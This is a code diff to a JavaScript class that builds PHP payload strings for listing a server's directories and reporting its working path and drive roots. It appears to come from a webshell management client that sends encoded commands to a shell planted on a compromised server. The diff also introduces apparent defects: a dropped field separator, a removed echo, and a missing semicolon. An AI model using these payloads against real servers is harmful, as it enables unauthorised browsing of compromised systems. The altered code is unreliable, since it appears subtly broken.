@@ -14,30 +14,36 @@ export default class File {
         } else {
             $res = '';
             foreach (scandir($dir) as $value) {
-                if ($value === '.' || $value === '..') continue;
+                if ($value === '.' || $value === '..') {
+                    continue;
+                }
                 $file = $dir . $value;
-                $res .= $value . '\`\`' . (is_dir($file) ? '1' : '0') . '\`\`' . date("Y/m/d H:i", filemtime($file)) . '\`\`' . @filesize($file);
-                $res .= "\\n";
+                $res .= $value . '\`\`';
+                $res .= is_dir($file) ? '1' : '0';
+                $res .= date("Y/m/d H:i", filemtime($file)) . '\`\`';
+                $res .= @filesize($file);
+                $res .= "\n";
             }
-            ${arguments[0]}; 
-            echo encode($res); 
-        }
-        `
+            ${arguments[0]}
+            encode($res);
+        }`
     }
 
     pwd() {
         return `
-        $path = dirname($_SERVER["SCRIPT_FILENAME"]);
-        if ($path == "") $path = dirname($_SERVER["PATH_TRANSLATED"]);
-        if ($path == "") $path = getcwd();
+        $path = dirname($_SERVER['SCRIPT_FILENAME']);
+        if (empty($path)){ $path = dirname($_SERVER['PATH_TRANSLATED']);}
+        if (empty($path)){ $path = getcwd();}
         $root_path = '';
-        if (substr($path, 0, 1) != "/") {
-            foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:|";
+        if (substr($path, 0, 1) != '/') {
+            foreach (range('C', 'Z') as $L) {
+                if (is_dir($L . ':')) {$root_path .= $L . ':|';}
+            }
         } else {
-            $root_path .= "/";
-        } 
+            $root_path .= '/';
+        }
         ${arguments[0]}; 
-        encode($root_path . '\`\`' . $path); 
+        encode($root_path . '\`\`' . $path);
         `
     }
 
